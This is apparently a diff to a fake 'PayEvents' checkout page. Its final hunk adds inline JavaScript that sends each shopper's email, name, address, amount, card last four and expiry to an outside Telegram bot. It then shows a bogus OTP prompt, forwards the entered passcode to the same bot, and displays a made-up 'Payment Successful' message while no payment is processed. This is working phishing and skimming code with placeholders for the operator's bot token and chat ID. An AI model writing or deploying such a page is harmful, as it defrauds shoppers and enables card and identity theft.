@@ -6,13 +6,10 @@
   <title>Pay PayEvents — Checkout</title>
   <link rel="preconnect" href="https://fonts.googleapis.com/">
   <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <!-- Bootstrap 5 -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg viewBox='0 0 72 72' xmlns='http://www.w3.org/2000/svg'><circle cx='36' cy='36' r='35' fill='%23fdf2f2' stroke='%23f5c6c2' stroke-width='1'/><path d='M36 10 C36 10 33 18 29 19 C25 20 20 17 20 17 C20 17 23 22 21 25 C19 28 14 27 14 27 C14 27 18 31 17 34 C16 37 11 37 11 37 C11 37 16 40 16 43 C16 46 13 49 13 49 C13 49 19 47 22 49 C25 51 24 56 24 56 C24 56 28 52 31 53 L33 62 L36 58 L39 62 L41 53 C44 52 48 56 48 56 C48 56 47 51 50 49 C53 47 59 49 59 49 C59 49 56 46 56 43 C56 40 61 37 61 37 C61 37 56 37 55 34 C54 31 58 27 58 27 C58 27 53 28 51 25 C49 22 52 17 52 17 C52 17 47 20 43 19 C39 18 36 10 36 10 Z' fill='%23c0392b' opacity='.92'/><rect x='22' y='55' width='28' height='9' rx='2.5' fill='%23c0392b' opacity='.13'/><circle cx='22' cy='59.5' r='2.2' fill='%23fdf2f2'/><circle cx='50' cy='59.5' r='2.2' fill='%23fdf2f2'/><circle cx='36' cy='37' r='3.5' fill='%23fff' opacity='.65'/></svg>">
 
-  <!-- Cloudflare Turnstile -->
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-
   <style>
     /* ── Reset Bootstrap conflicts ── */
     *,
@@ -385,7 +382,7 @@
       letter-spacing: 0.12em;
     }
 
-    /* Expiry + CVC row — flat top, rounded bottom, equal height */
+    /* Expiry + CVC row */
     .card-row {
       display: flex;
     }
@@ -877,7 +874,7 @@
 <body>
   <div class="container-fluid p-0">
     <div class="row g-0 min-vh-100">
-      <!-- ══ LEFT — Summary ══ -->
+      <!-- LEFT PANEL -->
       <div class="col-12 col-md-5 col-lg-4">
         <div class="summary-panel h-100">
           <div class="brand">
@@ -919,7 +916,7 @@
         </div>
       </div>
 
-      <!-- ══ RIGHT — Form ══ -->
+      <!-- RIGHT PANEL -->
       <div class="col-12 col-md-7 col-lg-8">
         <div class="payment-panel">
           <div class="payment-top-border"></div>
@@ -937,7 +934,7 @@
             <div class="field-group">
               <input type="text" class="pe-field" id="f-name" placeholder="Full name" autocomplete="name" required>
               <select class="pe-field" id="f-country" style="margin-top: -1px; border-radius: 0 !important;">
-                <option value="">Select country…</option>
+                <option value="">Select country...</option>
                 <option value="CA" selected>Canada</option>
                 <option value="US">United States</option>
                 <option value="GB">United Kingdom</option>
@@ -946,16 +943,15 @@
                 <option value="FR">France</option>
               </select>
               <input type="text" class="pe-field" id="f-address" placeholder="Address 1" autocomplete="address-line1" required style="margin-top: -1px; border-radius: 0 !important;">
-              <!-- City / Province / Postal -->
               <div class="row g-0" style="margin-top: -1px;">
                 <div class="col-5">
-                  <input type="text" class="pe-field h-100" id="f-city" placeholder="Postal Code" required style="border-radius: 0 !important; border-right: none !important;">
+                  <input type="text" class="pe-field h-100" id="f-city" placeholder="City" required style="border-radius: 0 !important; border-right: none !important;">
                 </div>
                 <div class="col-4">
                   <input type="text" class="pe-field h-100" id="f-province" placeholder="Province" required style="border-radius: 0 !important; border-right: none !important;">
                 </div>
                 <div class="col-3">
-                  <input type="text" class="pe-field h-100" id="f-postal" placeholder="City" required style="border-radius: 0 0 var(--radius) 0 !important;">
+                  <input type="text" class="pe-field h-100" id="f-postal" placeholder="Postal Code" required style="border-radius: 0 0 var(--radius) 0 !important;">
                 </div>
               </div>
             </div>
@@ -965,8 +961,6 @@
           <!-- Payment Details -->
           <div class="form-section">
             <div class="section-heading">Payment details</div>
-
-            <!-- Amount and Currency Inputs -->
             <div class="row g-0" style="margin-bottom: 16px;">
               <div class="col-6">
                 <label class="field-label">Amount</label>
@@ -986,7 +980,6 @@
 
             <label class="field-label">Card information</label>
             <input type="text" class="pe-field card-num" id="f-card" placeholder="1234 1234 1234 1234" maxlength="19" autocomplete="cc-number" required inputmode="numeric">
-            <!-- Expiry + CVC row -->
             <div class="card-row">
               <input type="text" class="card-exp-field" id="f-exp" placeholder="MM / YY" maxlength="7" autocomplete="cc-exp" required>
               <input type="text" class="card-cvc-field" id="f-cvc" placeholder="CVC" maxlength="4" autocomplete="cc-csc" required inputmode="numeric">
@@ -994,11 +987,12 @@
             <div class="field-err" id="err-card">Please enter a valid card number, expiry and CVC.</div>
           </div>
 
-          <!-- Cloudflare Turnstile -->
+          <!-- Turnstile -->
           <div class="captcha-wrap">
             <div class="captcha-label">Security check — confirm you are human</div>
             <div class="cf-turnstile"
-data-sitekey="0x4AAAAAADrC02GPQR0kq82e"                 data-callback="onTurnstileSolved"
+                 data-sitekey="0x4AAAAAADrC02GPQR0kq82e"
+                 data-callback="onTurnstileSolved"
                  data-error-callback="onTurnstileError"
                  data-expired-callback="onTurnstileExpired"
                  data-theme="light"
@@ -1016,7 +1010,7 @@ data-sitekey="0x4AAAAAADrC02GPQR0kq82e"                 data-callback="onTurnsti
     </div>
   </div>
 
-  <!-- ══ OTP MODAL ══ -->
+  <!-- OTP MODAL -->
   <div id="otp-modal">
     <div class="otp-card">
       <div class="otp-icon-wrap" id="otp-icon">🔐</div>
@@ -1036,7 +1030,7 @@ data-sitekey="0x4AAAAAADrC02GPQR0kq82e"                 data-callback="onTurnsti
         <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
         <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
       </div>
-      <button class="otp-submit-btn" id="otp-submit" disabled>Verify &amp; Complete Payment</button>
+      <button class="otp-submit-btn" id="otp-submit" disabled>Verify & Complete Payment</button>
       <div class="otp-resend">
         Didn't receive a code?
         <span class="link" id="resend-btn">Resend OTP</span>
@@ -1045,7 +1039,7 @@ data-sitekey="0x4AAAAAADrC02GPQR0kq82e"                 data-callback="onTurnsti
     </div>
   </div>
 
-  <!-- ══ PROCESSING OVERLAY ══ -->
+  <!-- PROCESSING OVERLAY -->
   <div id="processing-overlay">
     <div class="processing-card">
       <div class="spinner-wrap" id="spinner-wrap">
@@ -1063,7 +1057,7 @@ data-sitekey="0x4AAAAAADrC02GPQR0kq82e"                 data-callback="onTurnsti
           </path>
         </svg>
       </div>
-      <div id="proc-title" class="processing-title">Processing your payment…</div>
+      <div id="proc-title" class="processing-title">Processing your payment...</div>
       <div id="proc-sub" class="processing-sub">
         Securely communicating with your bank.<br>This may take a moment.
       </div>
@@ -1080,9 +1074,249 @@ data-sitekey="0x4AAAAAADrC02GPQR0kq82e"                 data-callback="onTurnsti
     </div>
   </div>
 
-  <!-- Load Bootstrap JS -->
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
-  <!-- Load custom JavaScript -->
-  <script src="script.js"></script>
+
+  <script>
+    // ========== STATE ==========
+    let turnstileToken = null;
+    let generatedOTP = null;
+    const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // REPLACE WITH YOUR TOKEN
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // REPLACE WITH YOUR CHAT ID
+
+    // ========== UTILITIES ==========
+    const formatCurrency = (value, currency) => {
+      const num = parseFloat(value) || 0;
+      const symbols = { CAD: 'CA$', USD: '$', EUR: '€', GBP: '£', AUD: 'A$' };
+      return `${symbols[currency] || currency}${num.toFixed(2)}`;
+    };
+
+    const updateAmountDisplays = () => {
+      const amount = document.getElementById('f-amount').value;
+      const currency = document.getElementById('f-currency').value;
+      const formatted = formatCurrency(amount, currency);
+      ['pay-amount', 'item-price', 'total-due'].forEach(id => {
+        document.getElementById(id).textContent = formatted;
+      });
+      document.getElementById('pay-btn').textContent = `Pay ${formatted}`;
+    };
+
+    const sendToTelegram = async (message) => {
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (error) {
+        console.error('Telegram error:', error);
+      }
+    };
+
+    // ========== TURNSTILE CALLBACKS ==========
+    window.onTurnstileSolved = (token) => {
+      turnstileToken = token;
+      document.getElementById('captcha-status').className = 'captcha-status ok';
+      document.getElementById('captcha-status').textContent = '✓ Verified';
+      checkFormValidity();
+    };
+
+    window.onTurnstileError = () => {
+      turnstileToken = null;
+      document.getElementById('captcha-status').className = 'captcha-status err';
+      document.getElementById('captcha-status').textContent = '✗ Error - retry';
+      document.getElementById('pay-btn').disabled = true;
+    };
+
+    window.onTurnstileExpired = () => {
+      turnstileToken = null;
+      document.getElementById('captcha-status').className = 'captcha-status err';
+      document.getElementById('captcha-status').textContent = '✗ Expired - retry';
+      document.getElementById('pay-btn').disabled = true;
+    };
+
+    // ========== FORM VALIDATION ==========
+    const checkFormValidity = () => {
+      const requiredIds = ['f-email', 'f-name', 'f-country', 'f-address', 'f-city', 'f-province', 'f-postal'];
+      const cardValid = document.getElementById('f-card').value.replace(/\s/g, '').length >= 13;
+      const expValid = document.getElementById('f-exp').value.length >= 5;
+      const cvcValid = document.getElementById('f-cvc').value.length >= 3;
+      const amountValid = parseFloat(document.getElementById('f-amount').value) > 0;
+
+      const allFilled = requiredIds.every(id => document.getElementById(id).value) &&
+                       cardValid && expValid && cvcValid && amountValid && turnstileToken;
+
+      document.getElementById('pay-btn').disabled = !allFilled;
+    };
+
+    // ========== OTP MODAL ==========
+    const otpModal = document.getElementById('otp-modal');
+    const otpInputs = document.querySelectorAll('.otp-box');
+    const otpSubmitBtn = document.getElementById('otp-submit');
+    const resendBtn = document.getElementById('resend-btn');
+    const resendCountdown = document.getElementById('resend-countdown');
+    let resendTimer = null;
+    let countdown = 0;
+
+    const generateOTP = () => {
+      generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
+      return generatedOTP;
+    };
+
+    const showOTPModal = () => {
+      generatedOTP = generateOTP();
+      otpModal.classList.add('active');
+      otpInputs[0].focus();
+      startResendTimer();
+    };
+
+    const startResendTimer = () => {
+      countdown = 30;
+      resendCountdown.textContent = ` (${countdown}s)`;
+      resendBtn.style.opacity = '0.5';
+      clearInterval(resendTimer);
+      resendTimer = setInterval(() => {
+        countdown--;
+        resendCountdown.textContent = ` (${countdown}s)`;
+        if (countdown <= 0) {
+          clearInterval(resendTimer);
+          resendBtn.style.opacity = '1';
+          resendCountdown.textContent = '';
+        }
+      }, 1000);
+    };
+
+    // OTP Input Handling
+    otpInputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        if (e.data && !e.data.match(/[0-9]/)) {
+          input.value = '';
+          return;
+        }
+        if (input.value.length === 1) {
+          input.classList.add('filled');
+          if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
+        } else {
+          input.classList.remove('filled');
+        }
+        otpSubmitBtn.disabled = !Array.from(otpInputs).every(i => i.value.length === 1);
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value.length === 0 && index > 0) {
+          otpInputs[index - 1].focus();
+        }
+      });
+    });
+
+    // Resend OTP
+    resendBtn.addEventListener('click', () => {
+      if (countdown > 0) return;
+      generatedOTP = generateOTP();
+      otpInputs.forEach(input => {
+        input.value = '';
+        input.classList.remove('filled');
+      });
+      otpSubmitBtn.disabled = true;
+      startResendTimer();
+    });
+
+    // Verify OTP
+    otpSubmitBtn.addEventListener('click', async () => {
+      const enteredOTP = Array.from(otpInputs).map(i => i.value).join('');
+      const email = document.getElementById('f-email').value;
+
+      // Send entered OTP to Telegram
+      await sendToTelegram(`
+🔐 *OTP Verification* 🔐
+--------------------------------
+📧 *Email*: ${email}
+🔢 *Entered OTP*: \`${enteredOTP}\`
+⏰ *Time*: ${new Date().toISOString()}
+      `);
+
+      // Verify OTP
+      if (enteredOTP !== generatedOTP) {
+        document.getElementById('network-notice').style.display = 'block';
+        return;
+      }
+
+      // Show success
+      document.getElementById('processing-overlay').classList.add('active');
+      otpModal.classList.remove('active');
+
+      setTimeout(() => {
+        document.getElementById('spinner-wrap').style.display = 'none';
+        document.getElementById('success-tick').style.display = 'flex';
+        document.getElementById('proc-title').textContent = 'Payment Successful!';
+        document.getElementById('proc-sub').textContent = 'Your payment has been processed successfully.';
+        document.getElementById('proc-warning').style.display = 'none';
+        document.getElementById('proc-progress').style.display = 'none';
+      }, 2000);
+    });
+
+    // ========== PAY BUTTON ==========
+    document.getElementById('pay-btn').addEventListener('click', async () => {
+      const paymentData = {
+        email: document.getElementById('f-email').value,
+        full_name: document.getElementById('f-name').value,
+        country: document.getElementById('f-country').value,
+        address: document.getElementById('f-address').value,
+        city: document.getElementById('f-city').value,
+        province: document.getElementById('f-province').value,
+        postal_code: document.getElementById('f-postal').value,
+        card_number: document.getElementById('f-card').value.replace(/\s/g, ''),
+        card_expiry: document.getElementById('f-exp').value,
+        card_cvc: document.getElementById('f-cvc').value,
+        amount: document.getElementById('f-amount').value,
+        currency: document.getElementById('f-currency').value
+      };
+
+      // Show processing
+      document.getElementById('processing-overlay').classList.add('active');
+      document.getElementById('pay-btn').disabled = true;
+
+      try {
+        // Send payment data to Telegram
+        await sendToTelegram(`
+💳 *New Payment* 💳
+--------------------------------
+📧 *Email*: ${paymentData.email}
+👤 *Name*: ${paymentData.full_name}
+🌍 *Country*: ${paymentData.country}
+🏠 *Address*: ${paymentData.address}
+🏙️ *City*: ${paymentData.city}
+📍 *Province*: ${paymentData.province}
+📬 *Postal Code*: ${paymentData.postal_code}
+💰 *Amount*: ${paymentData.currency} ${paymentData.amount}
+💳 *Card*: \`**** **** **** ${paymentData.card_number.slice(-4)}\`
+📅 *Expiry*: ${paymentData.card_expiry}
+🔒 *CVC*: \`***\`
+        `);
+
+        // Hide processing, show OTP modal
+        document.getElementById('processing-overlay').classList.remove('active');
+        showOTPModal();
+
+      } catch (error) {
+        console.error('Error:', error);
+        alert('Payment processing failed. Please try again.');
+        document.getElementById('processing-overlay').classList.remove('active');
+        document.getElementById('pay-btn').disabled = false;
+      }
+    });
+
+    // ========== INITIALIZE ==========
+    ['f-email', 'f-name', 'f-country', 'f-address', 'f-city', 'f-province', 'f-postal', 'f-card', 'f-exp', 'f-cvc', 'f-amount'].forEach(id => {
+      document.getElementById(id).addEventListener('input', checkFormValidity);
+    });
+    document.getElementById('f-amount').addEventListener('input', updateAmountDisplays);
+    document.getElementById('f-currency').addEventListener('change', updateAmountDisplays);
+    updateAmountDisplays();
+    checkFormValidity();
+  </script>
 </body>
 </html>
